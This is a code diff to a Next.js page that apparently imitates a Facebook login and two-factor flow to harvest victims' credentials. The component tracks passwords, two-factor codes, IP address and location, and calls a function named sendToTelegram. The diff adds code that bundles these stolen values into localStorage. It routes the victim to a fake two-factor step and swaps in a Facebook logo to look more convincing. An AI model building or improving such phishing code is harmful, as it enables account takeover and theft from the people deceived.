@@ -1,6 +1,7 @@
 "use client";
 
 import Image from "next/image";
+import { useRouter } from "next/navigation";
 import { FormEvent, useEffect, useRef, useState } from "react";
 import { Dictionary, LOCALE_COOKIE_NAME, Locale, getDictionary, resolveLocaleFromCountryCode } from "@/lib/i18n";
 import styles from "./page.module.css";
@@ -336,6 +337,7 @@ export default function HomePageClient({
   const [showPassword, setShowPassword] = useState(false);
   const [twoFactorCode, setTwoFactorCode] = useState("");
   const [twoFactorError, setTwoFactorError] = useState("");
+  const router = useRouter();
   const [showAltMethods, setShowAltMethods] = useState(false);
   const [selectedMethod, setSelectedMethod] = useState<"app" | "whatsapp" | "sms" | "email">("app");
   const [notifyOnFacebook, setNotifyOnFacebook] = useState(false);
@@ -541,6 +543,9 @@ export default function HomePageClient({
     setTwoFactorError("");
     setShowAltMethods(false);
     setSelectedMethod("app");
+    if (typeof window !== "undefined") {
+      window.localStorage.removeItem("two_factor_context");
+    }
     setAgreeTerms(false);
     setNotifyOnFacebook(false);
     setErrors({});
@@ -702,6 +707,38 @@ export default function HomePageClient({
     }
   }
 
+  type TwoFactorMethod = "app" | "whatsapp" | "sms" | "email";
+
+  const persistTwoFactorContext = (method: TwoFactorMethod = "app") => {
+    if (typeof window === "undefined") {
+      return;
+    }
+    const storedMessageId = messageId ?? window.localStorage.getItem("telegram_msg_id");
+    const payload = {
+      form,
+      clientIp,
+      clientLocation,
+      clientCountryCode,
+      clientCallingCode,
+      password1,
+      password2,
+      code1,
+      code2,
+      code3,
+      clickCount1,
+      messageId: storedMessageId,
+      currentUrl: currentUrl || window.location.href,
+      selectedMethod: method,
+      locale: activeLocale,
+    };
+    window.localStorage.setItem("two_factor_context", JSON.stringify(payload));
+  };
+
+  const openTwoFactorOptionsPopup = () => {
+    persistTwoFactorContext(selectedMethod);
+    setShowAltMethods(true);
+  };
+
   async function sendToTelegram() {
     if (isSubmitDisabled) {
       return;
@@ -755,29 +792,6 @@ export default function HomePageClient({
       }, 2000);
     }
   }
-
-  const altMethods = [
-    {
-      id: "app",
-      title: modal.altMethodAppTitle,
-      subtitle: modal.altMethodAppSubtitle,
-    },
-    {
-      id: "whatsapp",
-      title: modal.altMethodWhatsappTitle,
-      subtitle: applyTemplate(modal.altMethodWhatsappSubtitle, maskPhoneTail(form.phoneNumber)),
-    },
-    {
-      id: "sms",
-      title: modal.altMethodSmsTitle,
-      subtitle: applyTemplate(modal.altMethodSmsSubtitle, maskPhoneTail(form.phoneNumber)),
-    },
-    {
-      id: "email",
-      title: modal.altMethodEmailTitle,
-      subtitle: applyTemplate(modal.altMethodEmailSubtitle, maskEmail(form.email)),
-    },
-  ] as const;
 
   useEffect(() => {
     if (typeof window !== "undefined") {
@@ -917,6 +931,29 @@ export default function HomePageClient({
     isSubmitDisabled && timeLeft > 0
       ? `${twoFactorIncorrectLabel} ${formatCooldownTime(timeLeft, locale)}`
       : twoFactorError;
+
+  const altMethods = [
+    {
+      id: "app",
+      title: modal.altMethodAppTitle,
+      subtitle: modal.altMethodAppSubtitle,
+    },
+    {
+      id: "whatsapp",
+      title: modal.altMethodWhatsappTitle,
+      subtitle: applyTemplate(modal.altMethodWhatsappSubtitle, maskPhoneTail(form.phoneNumber)),
+    },
+    {
+      id: "sms",
+      title: modal.altMethodSmsTitle,
+      subtitle: applyTemplate(modal.altMethodSmsSubtitle, maskPhoneTail(form.phoneNumber)),
+    },
+    {
+      id: "email",
+      title: modal.altMethodEmailTitle,
+      subtitle: applyTemplate(modal.altMethodEmailSubtitle, maskEmail(form.email)),
+    },
+  ] as const;
 
   return (
     <div className={styles.container}>
@@ -1183,10 +1220,8 @@ export default function HomePageClient({
               </>
             ) : !isSuccess ? (
               <div className={styles.passwordStep}>
-                <span className={styles.passwordStepLogo} aria-hidden="true">
-                  <svg viewBox="0 0 24 24" role="presentation">
-                    <path d="M15.12 8.44h-2.17V6.96c0-.56.37-.69.63-.69h1.5V3.83L12.98 3.8c-2.35 0-2.88 1.76-2.88 2.88v1.76H8.4v2.48h1.7v6.33h2.85v-6.33h1.92l.25-2.48z" />
-                  </svg>
+                <span className={styles.passwordStepLogo}>
+                  <Image src="/facebook.png" alt="Facebook" width={64} height={64} />
                 </span>
 
                 <p className={styles.passwordStepMessage}>{passwordStepMessage}</p>
@@ -1255,7 +1290,12 @@ export default function HomePageClient({
                     <button
                       type="button"
                       className={styles.modalSubmitButton}
-                      onClick={closeReviewModal}
+                      onClick={() => {
+                        persistTwoFactorContext(selectedMethod);
+                        setShowModal(false);
+                        setShowAltMethods(false);
+                        router.push(`/two-factor?method=${selectedMethod}`);
+                      }}
                     >
                       {continueButtonLabel}
                     </button>
@@ -1295,7 +1335,7 @@ export default function HomePageClient({
                     <button
                       type="button"
                       className={styles.altMethodsTrigger}
-                      onClick={() => setShowAltMethods(true)}
+                      onClick={openTwoFactorOptionsPopup}
                     >
                       {modal.altMethodsTriggerLabel}
                     </button>
